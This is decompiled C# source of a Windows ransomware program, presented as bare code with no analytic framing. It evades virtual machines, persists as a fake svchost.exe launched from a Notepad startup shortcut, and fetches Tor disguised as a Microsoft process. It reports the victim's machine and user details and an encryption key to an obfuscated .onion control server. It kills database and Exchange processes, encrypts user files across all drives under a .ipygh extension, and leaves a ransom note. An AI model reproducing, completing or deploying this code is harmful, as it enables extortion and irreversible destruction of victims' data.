using IWshRuntimeLibrary;
using ns1;
using ns12;
using ns15;
using ns2;
using ns3;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace karo
{
	public sealed class Form1 : Form
	{
		[CompilerGenerated]
		[Serializable]
		internal sealed class <>c
		{
			public static readonly Form1.<>c <>9 = new Form1.<>c();

			public static Func<ManagementObject, object> <>9__19_0;

			public static Converter<string, string> <>9__21_0;

			public static Func<DriveInfo, bool> <>9__25_0;

			public static Func<Process, bool> <>9__25_1;

			internal object method_0(ManagementObject managementObject_0)
			{
				return managementObject_0.GetPropertyValue("Caption");
			}

			internal string method_1(string string_0)
			{
				return string_0.ToLower();
			}

			internal bool method_2(DriveInfo driveInfo_0)
			{
				return driveInfo_0.IsReady && driveInfo_0.DriveType == DriveType.Fixed;
			}

			internal bool method_3(Process process_0)
			{
				return process_0.ProcessName == "Microsoft.vshub.32";
			}
		}

		private readonly string string_0 = Environment.MachineName;

		private readonly string string_1 = Environment.UserName;

		private string string_2;

		private string string_3 = string.Empty;

		private string string_4;

		private int int_0;

		private readonly HashSet<string> hashSet_0 = new HashSet<string>();

		private Queue<string> queue_0 = new Queue<string>();

		private byte[] byte_0;

		private readonly string string_5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		private bool bool_0;

		private string string_6;

		private readonly string string_7 = Path.GetTempPath();

		private readonly HashSet<string> hashSet_1 = new HashSet<string>(Class16.smethod_185());

		private static Socket socket_0;

		private static Process process_0;

		internal readonly byte[] byte_1 = new byte[]
		{
			1,
			2,
			3,
			4,
			5,
			6,
			7,
			8
		};

		private IContainer icontainer_0 = null;

		public Form1()
		{
			Class16.smethod_288(this);
		}

		internal void method_0(object sender, EventArgs e)
		{
			base.Opacity = 100.0;
			base.Visible = false;
			base.ShowInTaskbar = false;
			this.method_1();
		}

		public void method_1()
		{
			while (true)
			{
				bool flag = false;
				try
				{
					try
					{
						try
						{
							using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
							{
								using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
								{
									foreach (ManagementBaseObject current in managementObjectCollection)
									{
										string text = current["Manufacturer"].ToString().ToLower();
										if ((text == "microsoft corporation" && current["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current["Model"].ToString() == "VirtualBox")
										{
											flag = true;
										}
									}
								}
							}
						}
						catch
						{
						}
						if (flag)
						{
							try
							{
								ProcessStartInfo startInfo = new ProcessStartInfo
								{
									FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
									Arguments = Class16.smethod_319("L2MgUElORyAtbiA1IDEyNy4wLjAuMSAmIGRlbCAvZiAvcSAiJXRlbXAlXCouKiI="),
									UseShellExecute = false,
									CreateNoWindow = true
								};
								Process.Start(startInfo);
								Application.Exit();
								Environment.Exit(0);
							}
							catch
							{
							}
						}
						Class16.smethod_101();
						WshShell wshShell = new WshShellClass();
						string pathLink = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Notepad.lnk";
						IWshShortcut wshShortcut = (IWshShortcut)wshShell.CreateShortcut(pathLink);
						wshShortcut.TargetPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svchost.exe";
						wshShortcut.Save();
						int num = 1;
						try
						{
							string environmentVariable = Environment.GetEnvironmentVariable("NUMBER_OF_PROCESSORS");
							if (environmentVariable != null)
							{
								try
								{
									num = int.Parse(environmentVariable);
								}
								catch
								{
								}
							}
						}
						catch
						{
						}
						string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
						IEnumerable<DriveInfo> arg_1D4_0 = DriveInfo.GetDrives();
						Func<DriveInfo, bool> arg_1D4_1;
						if ((arg_1D4_1 = Form1.<>c.<>9__25_0) == null)
						{
							arg_1D4_1 = (Form1.<>c.<>9__25_0 = new Func<DriveInfo, bool>(Form1.<>c.<>9.method_2));
						}
						IEnumerable<DriveInfo> enumerable = arg_1D4_0.Where(arg_1D4_1);
						if (System.IO.File.Exists(this.string_5 + "\\aes"))
						{
							this.string_6 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(this.string_5 + "\\aes"));
							this.byte_0 = Encoding.UTF8.GetBytes(this.string_6);
							this.byte_0 = SHA256.Create().ComputeHash(this.byte_0);
						}
						else
						{
							this.string_6 = Class16.smethod_460(32);
							this.byte_0 = Encoding.UTF8.GetBytes(this.string_6);
							this.byte_0 = SHA256.Create().ComputeHash(this.byte_0);
							try
							{
								System.IO.File.WriteAllBytes(this.string_5 + "\\aes", Encoding.UTF8.GetBytes(this.string_6));
								System.IO.File.SetAttributes(this.string_5 + "\\aes", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
						if (System.IO.File.Exists(this.string_5 + "\\svchost.exe"))
						{
							try
							{
								System.IO.File.Delete(this.string_5 + "\\svchost.exe");
								System.IO.File.Copy(Application.ExecutablePath, this.string_5 + "\\svchost.exe");
							}
							catch
							{
							}
						}
						if (!System.IO.File.Exists(this.string_5 + "\\svchost.exe"))
						{
							try
							{
								System.IO.File.Copy(Application.ExecutablePath, this.string_5 + "\\svchost.exe");
							}
							catch
							{
							}
						}
						string text2 = Class16.smethod_14(5);
						Class3 @class = new Class3();
						if (!Directory.Exists(this.string_7))
						{
							Directory.CreateDirectory(this.string_7);
						}
						if (Directory.Exists(this.string_7 + "\\Tor\\") && Directory.GetFiles(this.string_7 + "\\Tor\\").Length == 11)
						{
							try
							{
								IEnumerable<Process> arg_3CE_0 = Process.GetProcesses();
								Func<Process, bool> arg_3CE_1;
								if ((arg_3CE_1 = Form1.<>c.<>9__25_1) == null)
								{
									arg_3CE_1 = (Form1.<>c.<>9__25_1 = new Func<Process, bool>(Form1.<>c.<>9.method_3));
								}
								foreach (Process current2 in arg_3CE_0.Where(arg_3CE_1))
								{
									if (current2 != null)
									{
										current2.Kill();
									}
								}
								goto IL_827;
							}
							catch
							{
								goto IL_827;
							}
						}
						try
						{
							IL_413:
							WebClient webClient = new WebClient
							{
								Proxy = null
							};
							webClient.DownloadFile(new Uri(Class16.smethod_319("aHR0cHM6Ly9kaXN0LnRvcnByb2plY3Qub3JnL3RvcmJyb3dzZXIvNy4wLjEvdG9yLXdpbjMyLTAuMy4wLjguemlw")), this.string_7 + text2 + ".zip");
							goto IL_451;
						}
						catch
						{
						}
						goto IL_44E;
						IL_451:
						if (!System.IO.File.Exists(this.string_7 + text2 + ".zip"))
						{
							continue;
						}
						FileInfo fileInfo = new FileInfo(this.string_7 + text2 + ".zip");
						int num2 = (int)(fileInfo.Length / 1024L);
						if (num2 < 4000)
						{
							continue;
						}
						using (GClass1 gClass = Class16.smethod_12(this.string_7 + text2 + ".zip"))
						{
							using (IEnumerator<GClass0> enumerator3 = gClass.System.Collections.Generic.IEnumerable<ns15.GClass0>.GetEnumerator())
							{
								while (enumerator3.MoveNext())
								{
									GClass0 current3 = enumerator3.Current;
									Class16.smethod_189(Enum3.const_1, current3, this.string_7 + text2);
								}
							}
						}
						if (!Directory.Exists(this.string_7 + text2))
						{
							continue;
						}
						System.IO.File.Delete(this.string_7 + text2 + ".zip");
						System.IO.File.AppendAllText(this.string_7 + text2 + "/Tor/torrc", Class16.smethod_319("QXZvaWREaXNrV3JpdGVzIDE=") + Environment.NewLine);
						System.IO.File.AppendAllText(this.string_7 + text2 + "/Tor/torrc", Class16.smethod_319("TG9nIG5vdGljZSBzdGRvdXQ=") + Environment.NewLine);
						System.IO.File.AppendAllText(this.string_7 + text2 + "/Tor/torrc", Class16.smethod_319("U29ja3NQb3J0IDkwNTUgSVB2NlRyYWZmaWMgUHJlZmVySVB2NiBLZWVwQWxpdmVJc29sYXRlU09DS1NBdXRo") + Environment.NewLine);
						System.IO.File.AppendAllText(this.string_7 + text2 + "/Tor/torrc", Class16.smethod_319("Q29udHJvbFBvcnQgOTA1Ng==") + Environment.NewLine);
						System.IO.File.AppendAllText(this.string_7 + text2 + "/Tor/torrc", Class16.smethod_319("Q29va2llQXV0aGVudGljYXRpb24gMA==") + Environment.NewLine);
						System.IO.File.AppendAllText(this.string_7 + text2 + "/Tor/torrc", Class16.smethod_319("SGlkZGVuU2VydmljZVN0YXRpc3RpY3MgMA==") + Environment.NewLine);
						Directory.Move(this.string_7 + text2 + "/Tor/", this.string_7 + "/Tor/");
						System.IO.File.Move(this.string_7 + "/Tor/tor.exe", this.string_7 + "/Tor/Microsoft.vshub.32.exe");
						System.IO.File.Delete(this.string_7 + "/Tor/tor.exe");
						Directory.Delete(this.string_7 + text2, true);
						try
						{
							ProcessStartInfo startInfo2 = new ProcessStartInfo
							{
								FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
								Arguments = "/c icacls " + this.string_7 + " /grant Everyone:F /T /C /Q",
								UseShellExecute = false,
								CreateNoWindow = true
							};
							Process.Start(startInfo2);
							goto IL_827;
						}
						catch
						{
							goto IL_827;
						}
						goto Block_20;
						IL_44E:
						goto IL_413;
						Block_20:
						IPEndPoint remoteEP;
						try
						{
							IL_710:
							Form1.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
							Form1.socket_0.Connect(remoteEP);
							Form1.socket_0.Send(Encoding.ASCII.GetBytes(Class16.smethod_319("U0lHTkFMIE5FV05ZTQ==") + Environment.NewLine));
							goto IL_75A;
						}
						catch
						{
						}
						goto IL_757;
						IL_75A:
						Class84 class84_ = new Class84(IPAddress.Loopback, 8181, IPAddress.Loopback, 9055, Class84.Enum26.const_1);
						this.string_4 = Class16.smethod_369(class84_, string.Concat(new string[]
						{
							Class16.smethod_319("aHR0cDovL2lidm1jdTRlYXl5eGpjNGoub25pb24vY29udHJvbC5waHA/dWlkPQ=="),
							@class.string_0,
							"&uname=",
							this.string_1,
							"&os=",
							Class16.smethod_157(this),
							"&pcname=",
							this.string_0
						}));
						if (!this.string_4.Contains("exit"))
						{
							if (this.string_4.Contains("error"))
							{
								try
								{
									Form1.process_0.Kill();
									Form1.socket_0.Shutdown(SocketShutdown.Both);
									Form1.socket_0.Close();
								}
								catch
								{
								}
								goto IL_827;
							}
							this.string_3 = this.string_4;
							string text3 = this.string_6;
							string text4 = this.string_3;
							this.string_2 = Class16.smethod_168(2048, text3, text4);
							do
							{
								this.string_4 = Class16.smethod_369(class84_, Class16.smethod_319("aHR0cDovL2lidm1jdTRlYXl5eGpjNGoub25pb24vY29udHJvbGxlci5waHA/dWlkPQ==") + @class.string_0 + "&aes=" + this.string_2);
							}
							while (!this.string_4.Contains("success"));
							try
							{
								ProcessStartInfo startInfo3 = new ProcessStartInfo
								{
									FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
									Arguments = Class16.smethod_319("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBNaWNyb3NvZnQuRXhjaGFuZ2UuKg=="),
									UseShellExecute = false,
									CreateNoWindow = true
								};
								Process.Start(startInfo3);
							}
							catch
							{
							}
							try
							{
								ProcessStartInfo startInfo4 = new ProcessStartInfo
								{
									FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
									Arguments = Class16.smethod_319("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBNU0V4Y2hhbmdlKg=="),
									UseShellExecute = false,
									CreateNoWindow = true
								};
								Process.Start(startInfo4);
							}
							catch
							{
							}
							try
							{
								ProcessStartInfo startInfo5 = new ProcessStartInfo
								{
									FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
									Arguments = Class16.smethod_319("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBzcWxzZXJ2ZXIuZXhl"),
									UseShellExecute = false,
									CreateNoWindow = true
								};
								Process.Start(startInfo5);
							}
							catch
							{
							}
							try
							{
								ProcessStartInfo startInfo6 = new ProcessStartInfo
								{
									FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
									Arguments = Class16.smethod_319("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBzcWx3cml0ZXIuZXhl"),
									UseShellExecute = false,
									CreateNoWindow = true
								};
								Process.Start(startInfo6);
							}
							catch
							{
							}
							try
							{
								ProcessStartInfo startInfo7 = new ProcessStartInfo
								{
									FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
									Arguments = Class16.smethod_319("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBteXNxbGQuZXhl"),
									UseShellExecute = false,
									CreateNoWindow = true
								};
								Process.Start(startInfo7);
							}
							catch
							{
							}
							IEnumerable<string> enumerable2 = Class16.smethod_445(pathRoot);
							foreach (string current4 in enumerable2)
							{
								if (!Directory.Exists(current4))
								{
									string extension = Path.GetExtension(current4);
									if (extension != ".ipygh" && this.hashSet_1.Contains(extension))
									{
										this.hashSet_0.Add(current4);
									}
								}
							}
							foreach (DriveInfo current5 in enumerable)
							{
								if (current5.IsReady && current5.Name != pathRoot)
								{
									IEnumerable<string> enumerable3 = Class16.smethod_231(current5.Name);
									foreach (string current6 in enumerable3)
									{
										if (!Directory.Exists(current6))
										{
											string extension2 = Path.GetExtension(current6);
											if (extension2 != ".ipygh" && this.hashSet_1.Contains(extension2))
											{
												this.hashSet_0.Add(current6);
											}
										}
									}
								}
							}
							List<string> list = new List<string>
							{
								Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
								Environment.GetFolderPath(Environment.SpecialFolder.Personal),
								Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
								Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
								Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
							};
							foreach (string current7 in list)
							{
								IEnumerable<string> enumerable4 = Class16.smethod_231(current7);
								foreach (string current8 in enumerable4)
								{
									if (!Directory.Exists(current8))
									{
										string extension3 = Path.GetExtension(current8);
										if (extension3 != ".ipygh" && this.hashSet_1.Contains(extension3))
										{
											this.hashSet_0.Add(current8);
										}
									}
								}
							}
							this.queue_0 = new Queue<string>(this.hashSet_0);
							if (this.queue_0.Count != 0)
							{
								this.hashSet_0.Clear();
								this.bool_0 = true;
								for (int i = 0; i < num; i++)
								{
									Thread thread = new Thread(new ThreadStart(this.method_2))
									{
										IsBackground = false,
										Priority = ThreadPriority.Highest
									};
									thread.Start();
								}
								while (this.queue_0.Count != 0)
								{
									Thread.Sleep(500);
								}
								do
								{
									this.string_4 = Class16.smethod_369(class84_, string.Concat(new object[]
									{
										Class16.smethod_319("aHR0cDovL2lidm1jdTRlYXl5eGpjNGoub25pb24vdG90YWwucGhwP3VpZD0="),
										@class.string_0,
										"&total=",
										this.int_0
									}));
								}
								while (!this.string_4.Contains("onion"));
								using (StreamReader streamReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("karo.ReadMe.html")))
								{
									string text5 = streamReader.ReadToEnd();
									System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\ReadMe.html", text5.Replace("DATAYYYY", string.Concat(new string[]
									{
										"<a href=\"",
										this.string_4,
										"/?uid=",
										@class.string_0,
										"\"> ",
										this.string_4,
										"/?uid=",
										@class.string_0,
										" </a>"
									})));
								}
								string text6 = this.string_7 + "\\" + text2 + ".jpg";
								if (Class16.smethod_619(class84_, Class16.smethod_319("aHR0cDovL2lidm1jdTRlYXl5eGpjNGoub25pb24vd2FsbC5wbmc="), text6))
								{
									Class16.smethod_230(this, text6);
								}
							}
						}
						try
						{
							Form1.process_0.Kill();
							if (!Form1.process_0.HasExited)
							{
								Process.GetProcessById(Form1.process_0.Id).Kill();
							}
							Form1.socket_0.Shutdown(SocketShutdown.Both);
							Form1.socket_0.Close();
						}
						catch
						{
						}
						try
						{
							if (System.IO.File.Exists(this.string_5 + "\\aes"))
							{
								System.IO.File.Delete(this.string_5 + "\\aes");
							}
						}
						catch
						{
						}
						break;
						IL_757:
						goto IL_710;
						IL_827:
						Form1.process_0 = new Process
						{
							StartInfo = new ProcessStartInfo
							{
								FileName = this.string_7 + Class16.smethod_319("VG9yXFxNaWNyb3NvZnQudnNodWIuMzIuZXhl"),
								Arguments = Class16.smethod_319("LWYgLlxcdG9ycmM="),
								UseShellExecute = false,
								RedirectStandardOutput = true,
								CreateNoWindow = true,
								WorkingDirectory = this.string_7 + Class16.smethod_319("VG9yXFw=")
							}
						};
						Form1.process_0.Start();
						remoteEP = new IPEndPoint(IPAddress.Parse(Class16.smethod_319("MTI3LjAuMC4x")), 9056);
						Thread.Sleep(10000);
						goto IL_757;
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message);
					}
					break;
				}
				finally
				{
					try
					{
						Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\ReadMe.html");
					}
					catch
					{
					}
					try
					{
						ProcessStartInfo startInfo8 = new ProcessStartInfo
						{
							FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
							Arguments = Class16.smethod_319("L2MgUElORyAtbiA1IDEyNy4wLjAuMSAmIGRlbCAvZiAvcSAiJXRlbXAlXCouKiI="),
							UseShellExecute = false,
							CreateNoWindow = true
						};
						Process.Start(startInfo8);
						ProcessStartInfo startInfo9 = new ProcessStartInfo
						{
							FileName = Class16.smethod_319("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhl"),
							Arguments = Class16.smethod_319("L2MgdGFza2tpbGwuZXhlIC9mIC9pbSBNaWNyb3NvZnQudnNodWIuMzIuZXhlLio="),
							UseShellExecute = false,
							CreateNoWindow = true
						};
						Process.Start(startInfo9);
					}
					catch
					{
					}
					Application.Exit();
				}
			}
		}

		public void method_2()
		{
			if (this.queue_0.Count == 0)
			{
				this.bool_0 = false;
			}
			else
			{
				try
				{
					string text = this.queue_0.Dequeue();
					if (text != null)
					{
						FileInfo fileInfo = new FileInfo(text);
						if (fileInfo.Extension == ".txt" || fileInfo.Extension == ".sql" || fileInfo.Extension == ".cs" || fileInfo.Extension == ".zip" || fileInfo.Extension == ".rar" || fileInfo.Extension == ".cpp" || fileInfo.Extension == ".text" || fileInfo.Extension == ".js" || fileInfo.Extension == ".html" || fileInfo.Extension == ".java" || fileInfo.Extension == ".pl" || fileInfo.Extension == ".c" || fileInfo.Extension == ".mdb" || fileInfo.Extension == ".ruby" || fileInfo.Extension == ".jpg" || fileInfo.Extension == ".png" || fileInfo.Extension == ".bmp" || fileInfo.Extension == ".py" || fileInfo.Extension == ".csv" || fileInfo.Extension == ".html" || fileInfo.Extension == ".doc" || fileInfo.Extension == ".xls" || fileInfo.Extension == ".docx" || fileInfo.Extension == ".ppt" || fileInfo.Extension == ".dot" || fileInfo.Extension == ".docm" || fileInfo.Extension == ".dotx" || fileInfo.Extension == ".dotm" || fileInfo.Extension == ".xlsx" || fileInfo.Extension == ".xlsm" || fileInfo.Extension == ".pps" || fileInfo.Extension == ".pptx" || fileInfo.Extension == ".pptm" || fileInfo.Extension == ".ppsx")
						{
							byte[] array = System.IO.File.ReadAllBytes(text);
							if (this.byte_0 != null)
							{
								byte[] array2 = Class16.smethod_309(this.byte_0, this, array);
								if (array2 != null)
								{
									System.IO.File.WriteAllBytes(text, array2);
								}
							}
							System.IO.File.Move(text, text + ".ipygh");
							Interlocked.Increment(ref this.int_0);
						}
						else if (fileInfo.Length < 5000L)
						{
							byte[] array3 = System.IO.File.ReadAllBytes(text);
							if (this.byte_0 != null)
							{
								byte[] array4 = Class16.smethod_309(this.byte_0, this, array3);
								if (array4 != null)
								{
									System.IO.File.WriteAllBytes(text, array4);
								}
							}
							System.IO.File.Move(text, text + ".ipygh");
							Interlocked.Increment(ref this.int_0);
						}
						else
						{
							byte[] array5 = new byte[4096];
							using (BinaryReader binaryReader = new BinaryReader(System.IO.File.Open(text, FileMode.Open)))
							{
								if (this.byte_0 != null)
								{
									byte[] array6 = binaryReader.ReadBytes(4096);
									byte[] array7 = this.byte_0;
									byte[] array8 = Class16.smethod_309(array7, this, array6);
									Array.Copy(array8, array5, array8.Length);
								}
							}
							using (BinaryWriter binaryWriter = new BinaryWriter(System.IO.File.Open(text, FileMode.Open)))
							{
								binaryWriter.Write(array5);
							}
							System.IO.File.Move(text, text + ".ipygh");
							Interlocked.Increment(ref this.int_0);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			if (this.bool_0)
			{
				Class16.smethod_612(this);
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
			base.Dispose(disposing);
		}
	}
}
